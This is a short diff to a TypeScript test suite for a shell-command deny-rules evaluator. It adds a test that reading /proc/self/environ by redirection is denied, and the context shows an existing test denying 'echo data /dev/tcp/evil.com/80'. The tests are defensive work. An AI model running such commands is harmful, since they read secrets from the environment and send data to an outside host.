@@ -121,6 +121,10 @@ describe("deny rules", () => {
         "deny",
       );
     });
+    test("denies /proc/ access via redirection", () => {
+      const tokens: ShellToken[] = ["cat", { op: "<" }, "/proc/self/environ"];
+      expect(evaluateRules(parseSegment(tokens, false)).decision).toBe("deny");
+    });
     test("denies /dev/tcp/", () => {
       expect(
         evaluateRules(seg(["echo", "data", "/dev/tcp/evil.com/80"])).decision,
